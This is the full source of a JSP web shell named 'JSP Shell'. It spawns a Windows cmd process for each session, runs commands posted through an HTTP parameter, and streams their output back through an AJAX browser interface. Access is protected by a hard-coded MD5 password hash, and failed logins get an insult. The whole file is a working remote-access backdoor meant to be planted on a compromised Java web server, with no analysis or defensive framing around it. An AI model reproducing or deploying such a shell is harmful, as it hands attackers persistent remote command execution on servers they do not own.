<%@page contentType="text/html"%><%@page pageEncoding="UTF-8"%><%@page import="java.io.*"%><%@page import="java.io.File.*"%><%@page import="java.security.MessageDigest"%><%!
    public class ProcessThread extends Thread {

        private ByteArrayOutputStream progOutput = new ByteArrayOutputStream(1024);
        private ByteArrayOutputStream progErrorOutput = new ByteArrayOutputStream(1024);
        private BufferedWriter progIn;
        private Process proc;
        private InputStream inputStream;
        private InputStream inputStreamErro;
        private OutputStream outputStream;

        public ByteArrayOutputStream getProgOutput() {
            return progOutput;
        }

        public BufferedWriter getProgIn() {
            return progIn;
        }

        public ByteArrayOutputStream getProgError() {
            return progErrorOutput;
        }


        public void interrupt() {
            if (proc != null) {
                proc.destroy();
            }
            super.interrupt();
        }

        public void run() {
            Runtime runtime = Runtime.getRuntime();
            CopyThread copyThreadOut = null;
            CopyThread copyThreadError = null;
            try {
                proc = runtime.exec("cmd");// for Windows System use runtime.exec("cmd");
                inputStream = proc.getInputStream();
                copyThreadOut = new CopyThread("copyThreadOut", inputStream, progOutput);
                copyThreadOut.start();

                inputStreamErro = proc.getErrorStream();
                copyThreadError = new CopyThread("copyThreadError", inputStreamErro, progErrorOutput);
                copyThreadError.start();
                outputStream = proc.getOutputStream();
                progIn = new BufferedWriter(new OutputStreamWriter(outputStream));


                progOutput.write(("Exit=" + proc.waitFor()).getBytes());
                System.out.println("Process end!!!!!!!");
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            } finally {
                if (copyThreadOut != null && copyThreadOut.isAlive()) {

                    try {
                        copyThreadOut.stop();
                    } catch (Throwable t) {
                        t.printStackTrace();
                    }
                }
                if (copyThreadError != null && copyThreadError.isAlive()) {
                    try {
                        copyThreadError.stop();
                    } catch (Throwable t) {
                        t.printStackTrace();
                    }
                }
            }
        }
    }

    public class CopyThread extends Thread {

        private InputStream inputStream;
        private OutputStream outputStream;
        private String name;

        public CopyThread(String name, InputStream inputStream, OutputStream outputStream) {
            this.inputStream = inputStream;
            this.outputStream = outputStream;
            this.name = name;
        }

        @Override
        public void run() {
            int _char;
            try {
                while ((_char = inputStream.read()) > 0) {
                    System.out.write(_char);
                    synchronized (outputStream) {
                        outputStream.write(_char);
                    }
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private void setupProcess(HttpSession session) {
        Thread processThreadSessionOld = (Thread) session.getAttribute("process");
        if (processThreadSessionOld != null) {
            processThreadSessionOld.interrupt();
        }
        ProcessThread processThreadSession = new ProcessThread();
        processThreadSession.start();
        session.setAttribute("process", processThreadSession);
        while(processThreadSession.getProgIn()==null && processThreadSession.isAlive()){
            
        }
        session.setAttribute("progInBufferedWriter", processThreadSession.getProgIn());
        session.setAttribute("progOutputByteArrayOutputStream", processThreadSession.getProgOutput());
        session.setAttribute("progErrorByteArrayOutputStream", processThreadSession.getProgError());
    }

    private String getOutput(HttpSession session) {
        ByteArrayOutputStream progOutput = (ByteArrayOutputStream) session.getAttribute("progOutputByteArrayOutputStream");
        ByteArrayOutputStream progErrorOutput = (ByteArrayOutputStream) session.getAttribute("progErrorByteArrayOutputStream");
        StringBuilder stringBuilder = new StringBuilder();
        if (progOutput != null) {
            synchronized (progOutput) {
                stringBuilder.append(progOutput.toString());
                progOutput.reset();
            }
        }
        if (progErrorOutput != null) {
            synchronized (progErrorOutput) {
                stringBuilder.append(progErrorOutput.toString());
                progErrorOutput.reset();
            }
        }
        return stringBuilder.toString();
    }

    private void execute(HttpSession session, String cmd) throws IOException {
        BufferedWriter progIn = (BufferedWriter) session.getAttribute("progInBufferedWriter");
        if (progIn != null) {
            progIn.write(cmd + "\n");
            progIn.flush();
        }

    }
%><%
            String ServeName = request.getRequestURI();
            String IsAuth = (String) session.getAttribute("isauth");
            if ("true".equals(IsAuth)) {

                String function = request.getParameter("function");
                if (function != null) {
                    if ("exit".equalsIgnoreCase(function)) {
                        session.invalidate();
                        return;
                    }
                    if ("execute".equalsIgnoreCase(function)) {
                        String cmd = request.getParameter("cmd");
                        if (cmd != null && !cmd.isEmpty()) {
                            execute(session, cmd);


                        }
                    } else if ("update".equalsIgnoreCase(function)) {
                        out.write(getOutput(session));

                    } else if ("controlc".equalsIgnoreCase(function)) {
                        setupProcess(session);
                    }
                    return;
                }
            }
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<HTML>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Shell</title>
        
        <script  type="text/javascript" language="javascript">
            function sendRequest(url,callbackOk,callbackKo,postData) {
                var req = createXMLHTTPObject();
                if (!req) return;
                var method = (postData) ? "POST" : "GET";
                req.open(method,url,true);
                req.setRequestHeader('User-Agent','XMLHTTP/1.0');
                if (postData){
                    req.setRequestHeader('Content-type','application/x-www-form-urlencoded');
                    req.setRequestHeader("Content-length", postData.length);
                    req.setRequestHeader("Connection", "close");
                }

                req.onreadystatechange = function () {
                    if (req.readyState != 4) return;
                    if ((req.status != 200) && (req.status != 304)) {
                        //			alert('HTTP error ' + req.status);
                        if(callbackKo){
                            callbackKo(req);
                        }
                        return;
                    }
                    callbackOk(req);
                }
                if (req.readyState == 4) return;
                req.send(postData);
            }



            var XMLHttpFactories = [
                function () {return new XMLHttpRequest()},
                function () {return new ActiveXObject("Msxml2.XMLHTTP")},
                function () {return new ActiveXObject("Msxml3.XMLHTTP")},
                function () {return new ActiveXObject("Microsoft.XMLHTTP")}
            ];

            function createXMLHTTPObject() {
                var xmlhttp = false;
                for (var i=0;i<XMLHttpFactories.length;i++) {
                    try {
                        xmlhttp = XMLHttpFactories[i]();
                    }
                    catch (e) {
                        continue;
                    }
                    break;
                }
                return xmlhttp;
            }            
            
            
            
            
            function exeCommand(myFunction){
                sendRequest('<%=ServeName%>' , 
                function(request){
                    if(!document.shell.autoUpdate.checked){
                        setTimeout("updateText();",1000);
                    }
                    document.shell.cmd.value = "";
                    
                },
                function(request){
                    alert("Error");
                },
                "function="+myFunction+"&cmd="+document.shell.cmd.value);
                return false;
            }
            
            function updateText(){                
                sendRequest('<%=ServeName%>' , 
                function(request){
                    document.shell.output.value = document.shell.output.value + request.responseText;
                    document.shell.output.scrollTop = document.shell.output.scrollHeight;
                    if(document.shell.autoUpdate.checked){
                        setTimeout("updateText();",500);
                    }
                    
                },
                function(request){
                    alert("Error on update");
                    document.shell.autoUpdate.checked = false;
                },
                "function=update");                
            }
            
        </script>
        
    </head>
    <body>
        <h1>JSP Shell</h1>
        <%
            if (session.isNew()) {
        %>
        <FORM action="<%=ServeName%>" method="POST">
            <fieldset>
                <legend>Authentication</legend>
                <p>Password:
                    <input type="password" name="pass" size="32" />
                    <input name="submit_btn" type="submit" value="ok" />
                </p>
            </fieldset>
        </FORM>
    </BODY>
</HTML>
<%
            return;
        } else {
            if ((IsAuth == null && request.getParameter("pass") != null)) {
                String pass = request.getParameter("pass");
                MessageDigest mdAlgorithm = MessageDigest.getInstance("MD5");

                mdAlgorithm.update(pass.getBytes());

                byte[] digest = mdAlgorithm.digest();
                StringBuffer hexString = new StringBuffer();

                for (int i = 0; i < digest.length; i++) {
                    pass = Integer.toHexString(0xFF & digest[i]);
                    if (pass.length() < 2) {
                        pass = "0" + pass;
                    }
                    hexString.append(pass);
                }

                if (!(hexString.toString().equalsIgnoreCase("95f292773550fc8d39aaa8ddc9f3cfac"))) {
%>
MUKHA MO!!!
<%
                        session.invalidate();
                        return;
                    } else {
                        session.setAttribute("isauth", "true");
                        //Start proc
                        setupProcess(session);
                        
                    }
                } else if ("true".equals(IsAuth)) {
                } else {
                    session.invalidate();
                    return;
                }
            }
%>

<FORM NAME="shell" action="" method="POST" onsubmit="exeCommand('execute');return false;">
    <fieldset>
        <legend>Shell</legend>
        <p>
            <textarea name="output" cols="120" rows="25" readonly="readonly"
                      onfocus="this.oldValue=document.shell.autoUpdate.checked; document.shell.autoUpdate.checked = false;"
                      onblur="document.shell.autoUpdate.checked= this.oldValue; updateText();" ></textarea>
        </p>
        <p><input type="text" name="cmd" size="100"/><input type="submit" value="Enter" name="Enter" />
            <input type="button" value="Reset" name="controlcButton" onclick="exeCommand('controlc');return false;"/>
            <input type="button" value="Clean" name="cleanButton" onclick="document.shell.output.value='';return false;"/>
            <input type="checkbox" name="autoUpdate" value="AutoUpdate" onchange="if(this.checked){updateText();}" checked="true">Auto Update</input>        
        </p>
        
    </fieldset>
</FORM>
<FORM name="exitForm" action="<%=ServeName%>" method="POST">
    
    <p><input type="hidden" name="function" value="exit" /><input type="submit" value="Exit"  name="exit" /></p>
    
    
</FORM>
<script>
    updateText();
</script>
</BODY>
